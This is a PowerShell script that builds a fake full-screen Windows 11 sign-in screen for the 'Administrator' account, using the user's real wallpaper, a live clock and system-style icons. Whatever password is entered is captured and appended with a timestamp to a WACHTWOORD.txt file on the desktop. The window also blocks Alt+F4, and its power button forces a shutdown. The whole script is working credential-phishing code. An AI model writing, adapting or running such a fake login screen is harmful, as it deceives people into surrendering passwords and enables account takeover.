Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
 
# Create main form (full screen)
$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows 11"
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
 
# Get screen dimensions
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$screenWidth = $screen.Bounds.Width
$screenHeight = $screen.Bounds.Height
 
# Background image
# Get current desktop wallpaper from registry
$wallpaperPath = Get-ItemPropertyValue -Path "HKCU:\Control Panel\Desktop" -Name WallPaper
 
# Load the wallpaper as background image if it exists
if (Test-Path $wallpaperPath) {
    $wallpaperImage = [System.Drawing.Image]::FromFile($wallpaperPath)
    $background = New-Object System.Windows.Forms.PictureBox
    $background.Dock = [System.Windows.Forms.DockStyle]::Fill
    $background.Image = $wallpaperImage
    $background.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
} else {
    # Fallback color background if wallpaper not found
    $background = New-Object System.Windows.Forms.PictureBox
    $background.Dock = [System.Windows.Forms.DockStyle]::Fill
    $background.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 20)
}
$form.Controls.Add($background)
 
# Calculate center positions
$centerX = $screenWidth / 2
 
# User picture - now using Segoe MDL2 Assets
$userPicture = New-Object System.Windows.Forms.Label
$userPicture.Size = New-Object System.Drawing.Size(80, 80)
$userPicture.Location = New-Object System.Drawing.Point(($centerX - 40), 150)
$userPicture.BackColor = [System.Drawing.Color]::Transparent
$userPicture.Font = New-Object System.Drawing.Font("Segoe MDL2 Assets", 36, [System.Drawing.FontStyle]::Regular)
$userPicture.Text = [char]0xE77B  # Contact icon in Segoe MDL2 Assets
$userPicture.ForeColor = [System.Drawing.Color]::White
$userPicture.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$background.Controls.Add($userPicture)
 
# Username label
$userLabel = New-Object System.Windows.Forms.Label
$userLabel.Text = "Administrator"
$userLabel.ForeColor = [System.Drawing.Color]::White
$userLabel.BackColor = [System.Drawing.Color]::Transparent
$userLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Regular)
$userLabel.AutoSize = $true
$userLabel.Location = New-Object System.Drawing.Point(($centerX - ($userLabel.PreferredWidth / 2)), 250)
$background.Controls.Add($userLabel)
 
# Password box - FIXED PASSWORD CHARACTER
$passwordBox = New-Object System.Windows.Forms.TextBox
$passwordBox.Size = New-Object System.Drawing.Size(300, 30)
$passwordBox.Location = New-Object System.Drawing.Point(($centerX - 150), 300)
$passwordBox.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Regular)
$passwordBox.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$passwordBox.ForeColor = [System.Drawing.Color]::White
$passwordBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$passwordBox.PasswordChar = [char]0x25CF # Using Unicode bullet character
$passwordBox.Text = "Password"
$passwordBox.Add_GotFocus({
    $passwordBox.Add_KeyDown({
        if ($_.KeyCode -eq 'Enter') {
            $password = $passwordBox.Text
    
            $credentials = "Username: Administrator`nPassword: $password`nTimestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n"
            $desktopPath = [Environment]::GetFolderPath("Desktop")
            $path = Join-Path -Path $desktopPath -ChildPath "WACHTWOORD.txt"
            $credentials | Out-File -FilePath $path -Encoding UTF8 -Append
    
            [System.Windows.Forms.Application]::Exit()
        }
    })
    if ($this.Text -eq "Password") {
        $this.Text = ""
        $this.PasswordChar = [char]0x25CF
    }
})
$background.Controls.Add($passwordBox)
 
# Submit button
$submitButton = New-Object System.Windows.Forms.Button
$submitButton.Text = "Sign in"
$submitButton.Size = New-Object System.Drawing.Size(300, 40)
$submitButton.Location = New-Object System.Drawing.Point(($centerX - 150), 360)
$submitButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Regular)
$submitButton.BackColor = [System.Drawing.Color]::FromArgb(0, 90, 158)
$submitButton.ForeColor = [System.Drawing.Color]::White
$submitButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$submitButton.FlatAppearance.BorderSize = 0
$submitButton.Add_Click({
    $password = $passwordBox.Text
    
    # Save credentials to file
    $credentials = "Username: Administrator`nPassword: $password`nTimestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n"
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $path = Join-Path -Path $desktopPath -ChildPath "WACHTWOORD.txt"
    $credentials | Out-File -FilePath $path -Encoding UTF8 -Append
    
    # Close the entire application
    [System.Windows.Forms.Application]::Exit()
})
$background.Controls.Add($submitButton)
 
 
 
 
# Algemene instellingen
$iconSize = New-Object System.Drawing.Size(60, 60)
$iconFont = New-Object System.Drawing.Font("Segoe MDL2 Assets", 24)
 
# Improved Power options button with icon
$powerButton = New-Object System.Windows.Forms.Button
$powerButton.Size = $iconSize
$powerButton.Location = New-Object System.Drawing.Point(($screenWidth - 80), ($screenHeight - 80))
$powerButton.BackColor = [System.Drawing.Color]::Transparent
$powerButton.ForeColor = [System.Drawing.Color]::White
$powerButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$powerButton.FlatAppearance.BorderSize = 0
$powerButton.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
$powerButton.Font = $iconFont
$powerButton.Text = [char]0xE7E8  # Power symbol in Segoe MDL2 Assets
 
# Toegankelijkheid als knop
$accessIcon = New-Object System.Windows.Forms.Button
$accessIcon.Size = $iconSize
$accessIcon.Location = New-Object System.Drawing.Point(($screenWidth - 220), ($screenHeight - 80))
$accessIcon.BackColor = [System.Drawing.Color]::Transparent
$accessIcon.ForeColor = [System.Drawing.Color]::White
$accessIcon.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$accessIcon.FlatAppearance.BorderSize = 0
$accessIcon.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
$accessIcon.Font = $iconFont
$accessIcon.Text = [char]0xE776  # Ease of Access
$background.Controls.Add($accessIcon)
 
# Netwerk als knop
$networkIcon = New-Object System.Windows.Forms.Button
$networkIcon.Size = $iconSize
$networkIcon.Location = New-Object System.Drawing.Point(($screenWidth - 150), ($screenHeight - 80))
$networkIcon.BackColor = [System.Drawing.Color]::Transparent
$networkIcon.ForeColor = [System.Drawing.Color]::White
$networkIcon.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$networkIcon.FlatAppearance.BorderSize = 0
$networkIcon.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
$networkIcon.Font = $iconFont
$networkIcon.Text = [char]0xE701  # Network
$background.Controls.Add($networkIcon)
 
 
 
 
$powerButton.Add_Click({
    $result = [System.Windows.Forms.MessageBox]::Show("Do you want to shut down this computer?", "Shut Down", 
        [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)
    if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
        Stop-Computer -Force
    }
})
$background.Controls.Add($powerButton)
 
 
$tooltip = New-Object System.Windows.Forms.ToolTip
$tooltip.SetToolTip($networkIcon, "Netwerkstatus")
$tooltip.SetToolTip($accessIcon, "Vernieuwen")
$tooltip.SetToolTip($powerButton, "Uitschakelen")
 
# Date and time display
$timeLabel = New-Object System.Windows.Forms.Label
$timeLabel.ForeColor = [System.Drawing.Color]::White
$timeLabel.BackColor = [System.Drawing.Color]::Transparent
$timeLabel.Font = New-Object System.Drawing.Font("Segoe UI", 36, [System.Drawing.FontStyle]::Regular)
$timeLabel.AutoSize = $true
$timeLabel.Location = New-Object System.Drawing.Point(($centerX - ($timeLabel.PreferredWidth / 2)), 50)
$background.Controls.Add($timeLabel)
 
$dateLabel = New-Object System.Windows.Forms.Label
$dateLabel.ForeColor = [System.Drawing.Color]::White
$dateLabel.BackColor = [System.Drawing.Color]::Transparent
$dateLabel.AutoSize = $true
$dateLabel.Location = New-Object System.Drawing.Point(($centerX - ($dateLabel.PreferredWidth / 2)), 100)
$background.Controls.Add($dateLabel)
 
# Update time function
$updateTime = {
    $timeLabel.Text = (Get-Date).ToString("HH:mm")
    $timeLabel.Location = New-Object System.Drawing.Point(($centerX - ($timeLabel.PreferredWidth / 2)), 50)
    $dateLabel.Text = (Get-Date).ToString("dddd, MMMM dd")
    $dateLabel.Location = New-Object System.Drawing.Point(($centerX - ($dateLabel.PreferredWidth / 2)), 100)
}
 
# Timer to update clock
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1000
$timer.Add_Tick($updateTime)
$updateTime.Invoke()
$timer.Start()
 
# Handle Alt+F4 to prevent closing
$form.Add_Closing({
    if ($_.CloseReason -eq [System.Windows.Forms.CloseReason]::UserClosing) {
        $_.Cancel = $true
    }
})
 
# Show the form
[void]$form.ShowDialog()
